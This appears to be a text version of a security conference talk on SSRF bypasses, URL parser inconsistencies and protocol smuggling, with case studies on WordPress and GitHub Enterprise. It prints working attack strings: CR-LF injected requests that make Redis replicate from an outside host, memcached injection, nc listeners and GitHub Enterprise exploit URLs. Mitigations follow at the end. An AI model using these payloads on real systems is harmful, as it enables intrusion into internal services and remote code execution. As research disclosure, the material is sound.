# GLibc NSS Features and Protocol Smuggling

## Exploiting GLibc NSS Features on Protocol Smuggling

### HTTP/1.1 Requirement
HTTP/1.1 requires a `Host` header in the request. Here's an example of how to exploit this:

```http
GET / HTTP/1.1
Host: 127.0.0.1
SLAVEOF orange.tw 6379
:6379
Connection: close
```

To listen for the response, you can use `nc`:

```bash
$ nc -vvlp 6379
```

### HTTPS and SNI Injection
You can also exploit this with HTTPS by embedding the hostname in the SSL Client Hello. Replace `HTTP` with `HTTPS` in the URL:

```http
https://127.0.0.1\r\nSET foo 0 60 5\r\n:443/
```

And listen for the response:

```bash
$ nc -vvlp 443
```

### Python CVE-2016-5699
This vulnerability involves CR-LF injection in `HTTPConnection.putheader()`. The patch can be bypassed with a leading space:

```python
import urllib
url = 'http://0\r\n SLAVEOF orange.tw 6379\r\n :80'
urllib.urlopen(url)
```

### Redis and Memcached
Exploits can be facilitated using Redis and Memcached. For example:

```http
http://0\r\n SLAVEOF orange.tw 6379\r\n :6379/
```

## Abusing URL Parsers - Case Study

### WordPress
WordPress has several SSRF protections, but there are ways to bypass them. Here are some methods:

1. **Time-of-check to Time-of-use Problem**
   - Check the URL components and ensure they are valid.
   - Use `gethostbynamel()` to check if the address is in the disallowed list.
   - Fetch the URL using `cURL`.

   ```php
   $url_components = @parse_url($url);
   if(
       !$url_components ||
       empty($url_components['host']) ||
       (!empty($url_components['scheme']) && !in_array($url_components['scheme'], array('http', 'https'))) ||
       (!empty($url_components['port']) && !in_array($url_components['port'], array(80, 8080, 443)))
   ) { return false; }

   $addresses = gethostbynamel($url_components['host']);
   if($addresses) {
       // check addresses not in disallowed_remote_addresses
   }

   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, $url);
   curl_exec($ch);
   ```

2. **Inconsistency Between DNS Checker and URL Requester**
   - Use a URL with an IDNA character that `gethostbynamel()` cannot resolve, but `cURL` can.

   ```php
   $url = 'http://ß.orange.tw/';
   $host = parse_url($url)[host];
   $addresses = gethostbynamel($host); // bool(false)
   if ($address) {
       // check if address in white-list
   }

   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, $url);
   curl_exec($ch);
   ```

3. **Inconsistency Between URL Parser and URL Requester**
   - Fixed in PHP 7.0.13 and cURL 7.54.

   ```php
   $url = 'http://127.0.0.1:11211#@google.com:80/';
   $parsed = parse_url($url);
   var_dump($parsed[host]); // string(10) "google.com"
   var_dump($parsed[port]); // int(80)
   curl($url);
   ```

## Protocol Smuggling - Case Study

### GitHub Enterprise
GitHub Enterprise is a standalone version of GitHub, written in Ruby on Rails with obfuscated code.

#### Vulnerabilities
1. **SSRF-Bypass on Webhooks**
   - Bypass blacklisted hosts with a zero: `http://0/`.
   - Limitations: no 302 redirection, only HTTP/HTTPS, no CR-LF injection, only POST method.

2. **SSRF in Internal Graphite Service**
   - Graphite is bound to `127.0.0.1:8000`.
   - Exploit: `url = request.GET['url']` and use `HTTPConnection` to fetch the URL.

3. **CR-LF Injection in Graphite**
   - Use `httplib.HTTPConnection` to smuggle other protocols.
   - Example: `http://0:8000/composer/send_email?to=PI:EMAIL&url=http://127.0.0.1:6379/%0D%0ASET…`

4. **Unsafe Marshal in Memcached Gem**
   - Store Ruby objects in cache using `Marshal`.
   - Example: `http://0:8000/composer/send_email?to=PI:EMAIL&url=http://127.0.0.1:11211/%0D%0Aset...`

### Mitigations
- **Application Layer**: Use only IP and hostname, do not reuse the input URL.
- **Network Layer**: Use firewalls or network policies to block intranet traffic.

### Projects
- **SafeCurl** by @fin1te, advocated by @JordanMilne.

### Summary
- New attack surface on SSRF-bypass.
- URL parsing issues and IDNA standard abuse.
- New attack vectors on protocol smuggling.
- Linux Glibc NSS features and NodeJS Unicode failures.

### Acknowledgements
- Invalid URL parsing with '#' by @bagder.
- URL Interop by @bagder.
- Shibuya.XSS #8 by @mala.
- SSRF Bible by @Wallarm.
- Special thanks to Allen Own, Birdman Chiu, and Henry Huang.

### Cat Acknowledgements
- Twitter: @harapeko_lady
- Working Cat: https://tuswallpapersgratis.com/gato-trabajando/
- Cat in Carpet: https://carpet.vidalondon.net/cat-in-carpet/

Thank you!

PI:EMAIL
@orange_8361